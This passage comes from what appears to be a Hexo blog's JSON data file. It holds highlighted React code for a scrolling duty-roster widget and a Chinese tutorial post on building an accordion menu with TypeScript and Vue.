class=\"keyword\">this</span>.state;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div</span><br><span class=\"line\">                ref=<span class=\"string\">\"content\"</span></span><br><span class=\"line\">                onMouseEnter=&#123;<span class=\"keyword\">this</span>.removeHandleTimer&#125;</span><br><span class=\"line\">                onMouseLeave=&#123;<span class=\"keyword\">this</span>.addHandleTimer&#125;</span><br><span class=\"line\">                onWheel=&#123;<span class=\"keyword\">this</span>.handleScroll&#125;</span><br><span class=\"line\">            &gt;</span><br><span class=\"line\">                &lt;ul style=&#123;&#123;marginTop: scrollData + <span class=\"string\">\"px\"</span>&#125;&#125;&gt;</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        data.length &gt; <span class=\"number\">0</span> &amp;&amp; data.map(<span class=\"function\">(<span class=\"params\">item, index</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">return</span> (</span><br><span class=\"line\">                                    <span class=\"keyword\">this</span>.props.type === <span class=\"string\">'superior'</span> ?</span><br><span class=\"line\">                                        &lt;li key=&#123;item.id&#125;&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.name&#125;&gt;&#123;item.name&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.card&#125;&gt;&#123;item.card&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.show&#125;&gt;&#123;item.show&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.feedback&#125;&gt;&#123;item.feedback&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.state&#125;&gt;&#123;item.state&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                        &lt;/</span>li&gt;</span><br><span class=\"line\">                                        : &lt;li key=&#123;item.id&#125;&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.name&#125;&gt;&#123;item.name&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.card&#125;&gt;&#123;item.card&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.time&#125;&gt;&#123;item.time&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                            &lt;p title=&#123;item.origin&#125;&gt;&#123;item.origin&#125;&lt;/</span>p&gt;</span><br><span class=\"line\">                                            &lt;p title=&#123;item.destination&#125;&gt;&#123;item.destination&#125;&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                                        &lt;/</span>li&gt;</span><br><span class=\"line\">                                )</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &lt;<span class=\"regexp\">/ul&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;/</span>div&gt;</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>InformationOnDuty.js</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"./InformationOnDuty.scss\"</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; hidden &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ansi-colors\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> InformationOnDuty <span class=\"keyword\">extends</span> Component &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\">props</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">      dutyList: [],</span><br><span class=\"line\">      scrollData: <span class=\"number\">0</span>,</span><br><span class=\"line\">      inital: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getOnDutyListData = <span class=\"keyword\">this</span>.getOnDutyListData.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.animationInterval = <span class=\"keyword\">this</span>.animationInterval.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.removeAnimationInterval = <span class=\"keyword\">this</span>.removeAnimationInterval.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getOnDutyListData();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  getOnDutyListData() &#123;</span><br><span class=\"line\">    axios(&#123;</span><br><span class=\"line\">      method: <span class=\"string\">'GET'</span>,</span><br><span class=\"line\">      url: <span class=\"string\">`/OnDutyList`</span>,</span><br><span class=\"line\">    &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        dutyList: res.data.result</span><br><span class=\"line\">      &#125;, <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.animationInterval())</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  animationInterval() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; scrollData, dutyList &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!dutyList.length) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state.animationInterval = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        scrollData: scrollData--</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"keyword\">let</span> firstItem = dutyList[<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (scrollData &lt; <span class=\"number\">0</span> &amp;&amp; scrollData &gt; <span class=\"number\">-2</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.inital) &#123;</span><br><span class=\"line\">          dutyList.push(dutyList[<span class=\"number\">0</span>]);</span><br><span class=\"line\">          <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">            inital: <span class=\"literal\">false</span></span><br><span class=\"line\">          &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// dutyList.push(firstItem);</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (scrollData % <span class=\"number\">128</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// debugger</span></span><br><span class=\"line\"></span><br><span class=\"line\">        dutyList.shift();</span><br><span class=\"line\"></span><br><span class=\"line\">        dutyList.push(firstItem);</span><br><span class=\"line\">        scrollData = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"comment\">// debugger</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// if (scrollData &gt; -113) &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">      <span class=\"comment\">//   // dutyList.shift();</span></span><br><span class=\"line\">      <span class=\"comment\">//   // dutyList.push(firstItem);</span></span><br><span class=\"line\">      <span class=\"comment\">//   this.setState(&#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//     scrollData: scrollData--</span></span><br><span class=\"line\">      <span class=\"comment\">//   &#125;)</span></span><br><span class=\"line\">      <span class=\"comment\">// &#125; else &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//   scrollData = 0;</span></span><br><span class=\"line\">      <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">      <span class=\"comment\">//   dutyList.shift();</span></span><br><span class=\"line\">      <span class=\"comment\">//   dutyList.push(firstItem);</span></span><br><span class=\"line\">      <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">    &#125;, <span class=\"number\">60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  removeAnimationInterval() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state.animationInterval &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.state.animationInterval);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentWillReceiveProps() &#123;</span><br><span class=\"line\">    debugger</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componenWillUnmount() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.removeAnimationInterval();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> &#123; dutyList, scrollData &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"InformationOnDuty\"</span>&gt;</span><br><span class=\"line\">        &lt;div className=<span class=\"string\">\"title\"</span>&gt;</span><br><span class=\"line\">          &lt;div className=<span class=\"string\">\"tit1\"</span>&gt;&lt;span&gt;值班信息&lt;<span class=\"regexp\">/span&gt;&lt;/</span>div&gt;</span><br><span class=\"line\">          &lt;div className=<span class=\"string\">\"tit2\"</span>&gt;&lt;span&gt;查看值班表&lt;<span class=\"regexp\">/span&gt;&lt;/</span>div&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div</span></span><br><span class=\"line\"><span class=\"regexp\">          className=\"contetn\"</span></span><br><span class=\"line\"><span class=\"regexp\">          ref=\"content\"</span></span><br><span class=\"line\"><span class=\"regexp\">          onMouseEnter=&#123;this.removeAnimationInterval&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          onMouseLeave=&#123;this.animationInterval&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          style=&#123;&#123;overflow: \"hidden\"&#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        /</span><span class=\"regexp\">/ onWheel=&#123;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        &gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;div style=&#123;&#123; marginTop: scrollData + \"px\" &#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">              dutyList.map((item, index) =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">                return (</span></span><br><span class=\"line\"><span class=\"regexp\">                  &lt;div className=\"card\" key=&#123;`$&#123;item.title&#125;:$&#123;item.name&#125;$&#123;index&#125;`&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                    &lt;div className=\"row1\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                      &lt;span&gt;&#123;item.title&#125;&amp;nbsp;&lt;/</span>span&gt;&lt;b&gt;&amp;nbsp;|&amp;nbsp;&lt;<span class=\"regexp\">/b&gt;&lt;span&gt;&#123;item.name&#125;&lt;/</span>span&gt;</span><br><span class=\"line\">                    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                    &lt;div className=\"row2\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                      &lt;span className=&#123;item.title.length &gt; 3 ? 'nbsp4' : 'nbsp3'&#125;&gt;电话&amp;nbsp;&lt;/</span>span&gt;&lt;b&gt;&amp;nbsp;|&amp;nbsp;&lt;<span class=\"regexp\">/b&gt;&lt;span&gt;&#123;item.phone&#125;&lt;/</span>span&gt;</span><br><span class=\"line\">                    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">                  &lt;/</span>div&gt;</span><br><span class=\"line\">                )</span><br><span class=\"line\">              &#125;)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>div&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    )</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default InformationOnDuty;</span></span><br></pre></td></tr></table></figure></p>\n"},{"title":"面向对象-手写手风琴特效","date":"2018-05-24T02:56:14.000Z","_content":"## TS + ES6 + VUE 实现手风琴特效\n\n------\n### 第一步 定义 数据结构\n````\npublic list: any = [\n  {\n    card: '走进四海',\n    item: [\n      {\n        url: './into',\n        name: '四海简介'\n      },\n      {\n        url: './into',\n        name: '荣誉证书'\n      }\n    ]\n  },\n  {\n    card: '服务项目',\n    item: [\n      {\n        url: './server',\n        name: '服务项目'\n      }\n    ]\n  },\n  {\n    card: '施工案例',\n    item: [\n      {\n        url: './case',\n        name: '成品保护'\n      },\n      {\n        url: './case',\n        name: '保洁'\n      },\n      {\n        url: './case',\n        name: '外墙清洗'\n      },\n      {\n        url: './case',\n        name: '石材翻新'\n      },\n      {\n        url: './case',\n        name: '家政服务'\n      },\n      {\n        url: './case',\n        name: '电梯司机'\n      },\n      {\n        url: './case',\n        name: '停车管理'\n      },\n      {\n        url: './case',\n        name: '消防工程'\n      },\n      {\n        url: './case',\n        name: '拆迁工程'\n      },\n    ]\n  },\n  {\n    card: '团队风采',\n    item: [\n      {\n        url: './into',\n        name: '风采展示'\n      }\n    ]\n  },\n  {\n    card: '新闻中心',\n    item: [\n      {\n        url: './into',\n        name: '新闻中心'\n      }\n    ]\n  },\n  {\n    card: '人才招聘',\n    item: [\n      {\n        url: './into',\n        name: '招聘详情'\n      }\n    ]\n  },\n  {\n    card: '联系我们',\n    item: [\n      {\n        url: './into',\n        name: '联系方式'\n      }\n    ]\n  }\n]\n````\n\n`数据结构` 决定 `业务逻辑` 与 `实现思路`\n\n---\n### 第二步 根据数据实现虚拟DOM\n````\npublic listFor(h: CreateElement) {\n  let res = [];\n  for (let i = 0; i < this.list.length; i++) {\n    let dd = [];\n    for (let n = 0; n < this.list[i].item.length; n++) {\n        dd.push(\n          <span>\n            <router-link to={this.list[i].item[n].url}>{this.list[i].item[n].name}</router-link>\n          </span>\n        )\n    }\n\n    res.push(\n      <dl>\n        <dt onClick={() => { this.cardList(i + 1) }}>\n          <span class={this.listNum === i + 1 ? 'show' : ''}>{this.list[i].card}</span>\n        </dt>\n        <dd class={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}>\n          {dd}\n        </dd>\n      </dl >\n    )\n  }\n  return res\n}\n````\n---\n\n### 第三步 两个生命周期\n````\n// vue生命周期 挂载时执行\npublic mounted() {\n  this.showdd()\n}\n\n// vue生命周期 页面数据更新时执行\npublic updated() {\n  this.showdd()\n}\n````\n\n### 第四步 业务逻辑\n````\npublic showdd() {\n  let sideMenu = document.getElementsByClassName('sideMenu')[0];\n  \n  // 此循环为了每次点击前所有列表高度清零\n  for (let i = 0; i < sideMenu.children.length; i++) {\n    let evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n    evedd.setAttribute('style', `height: 0px`)\n  }\n\n  for (let i = 0; i < this.list.length; i++) {\n    /** 取得每个`dd`的Dom元素 */\n    let dd = sideMenu.getElementsByClassName(`showdd${i}`)[0]; \n    \n    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据\n    if (dd !== undefined) {\n      dd.setAttribute('style', `height:${itemLen * 36}px`)\n      console.log('get H', dd.clientHeight);\n    }\n    console.log(itemLen);\n  }\n}\n````\n\n### 第五步 CSS样式\n此步骤为样式的实现，根据 `class` 或 `id` 实现\n````\nele{\n    overflow: hidden;\n    opacity: 0; // 不太需要\n    height: 0;\n    transition: all .5s;\n}\n\nele.show {\n    opacity: 1; // 可以省略\n}\n````\n----------\n\n具体实现详见 `shrs`  四海日盛官网项目 `list.tsx`","source":"_posts/FrontEnd/JS特效实现/面向对象-手写手风琴特效.md","raw":"---\ntitle: 面向对象-手写手风琴特效\ndate: 2018-05-24 10:56:14\ntags: VUE ES6 TS 手风琴特效\ncategories: VUE \n---\n## TS + ES6 + VUE 实现手风琴特效\n\n------\n### 第一步 定义 数据结构\n````\npublic list: any = [\n  {\n    card: '走进四海',\n    item: [\n      {\n        url: './into',\n        name: '四海简介'\n      },\n      {\n        url: './into',\n        name: '荣誉证书'\n      }\n    ]\n  },\n  {\n    card: '服务项目',\n    item: [\n      {\n        url: './server',\n        name: '服务项目'\n      }\n    ]\n  },\n  {\n    card: '施工案例',\n    item: [\n      {\n        url: './case',\n        name: '成品保护'\n      },\n      {\n        url: './case',\n        name: '保洁'\n      },\n      {\n        url: './case',\n        name: '外墙清洗'\n      },\n      {\n        url: './case',\n        name: '石材翻新'\n      },\n      {\n        url: './case',\n        name: '家政服务'\n      },\n      {\n        url: './case',\n        name: '电梯司机'\n      },\n      {\n        url: './case',\n        name: '停车管理'\n      },\n      {\n        url: './case',\n        name: '消防工程'\n      },\n      {\n        url: './case',\n        name: '拆迁工程'\n      },\n    ]\n  },\n  {\n    card: '团队风采',\n    item: [\n      {\n        url: './into',\n        name: '风采展示'\n      }\n    ]\n  },\n  {\n    card: '新闻中心',\n    item: [\n      {\n        url: './into',\n        name: '新闻中心'\n      }\n    ]\n  },\n  {\n    card: '人才招聘',\n    item: [\n      {\n        url: './into',\n        name: '招聘详情'\n      }\n    ]\n  },\n  {\n    card: '联系我们',\n    item: [\n      {\n        url: './into',\n        name: '联系方式'\n      }\n    ]\n  }\n]\n````\n\n`数据结构` 决定 `业务逻辑` 与 `实现思路`\n\n---\n### 第二步 根据数据实现虚拟DOM\n````\npublic listFor(h: CreateElement) {\n  let res = [];\n  for (let i = 0; i < this.list.length; i++) {\n    let dd = [];\n    for (let n = 0; n < this.list[i].item.length; n++) {\n        dd.push(\n          <span>\n            <router-link to={this.list[i].item[n].url}>{this.list[i].item[n].name}</router-link>\n          </span>\n        )\n    }\n\n    res.push(\n      <dl>\n        <dt onClick={() => { this.cardList(i + 1) }}>\n          <span class={this.listNum === i + 1 ? 'show' : ''}>{this.list[i].card}</span>\n        </dt>\n        <dd class={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}>\n          {dd}\n        </dd>\n      </dl >\n    )\n  }\n  return res\n}\n````\n---\n\n### 第三步 两个生命周期\n````\n// vue生命周期 挂载时执行\npublic mounted() {\n  this.showdd()\n}\n\n// vue生命周期 页面数据更新时执行\npublic updated() {\n  this.showdd()\n}\n````\n\n### 第四步 业务逻辑\n````\npublic showdd() {\n  let sideMenu = document.getElementsByClassName('sideMenu')[0];\n  \n  // 此循环为了每次点击前所有列表高度清零\n  for (let i = 0; i < sideMenu.children.length; i++) {\n    let evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n    evedd.setAttribute('style', `height: 0px`)\n  }\n\n  for (let i = 0; i < this.list.length; i++) {\n    /** 取得每个`dd`的Dom元素 */\n    let dd = sideMenu.getElementsByClassName(`showdd${i}`)[0]; \n    \n    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据\n    if (dd !== undefined) {\n      dd.setAttribute('style', `height:${itemLen * 36}px`)\n      console.log('get H', dd.clientHeight);\n    }\n    console.log(itemLen);\n  }\n}\n````\n\n### 第五步 CSS样式\n此步骤为样式的实现，根据 `class` 或 `id` 实现\n````\nele{\n    overflow: hidden;\n    opacity: 0; // 不太需要\n    height: 0;\n    transition: all .5s;\n}\n\nele.show {\n    opacity: 1; // 可以省略\n}\n````\n----------\n\n具体实现详见 `shrs`  四海日盛官网项目 `list.tsx`","slug":"FrontEnd/JS特效实现/面向对象-手写手风琴特效","published":1,"updated":"2018-12-18T01:55:07.675Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0b00atzodvfmr7lyyk","content":"<h2 id=\"TS-ES6-VUE-实现手风琴特效\"><a href=\"#TS-ES6-VUE-实现手风琴特效\" class=\"headerlink\" title=\"TS + ES6 + VUE 实现手风琴特效\"></a>TS + ES6 + VUE 实现手风琴特效</h2><hr>\n<h3 id=\"第一步-定义-数据结构\"><a href=\"#第一步-定义-数据结构\" class=\"headerlink\" title=\"第一步 定义 数据结构\"></a>第一步 定义 数据结构</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public list: any = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;走进四海&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;四海简介&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;荣誉证书&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;服务项目&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./server&apos;,</span><br><span class=\"line\">        name: &apos;服务项目&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;施工案例&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;成品保护&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;保洁&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;外墙清洗&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;石材翻新&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;家政服务&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      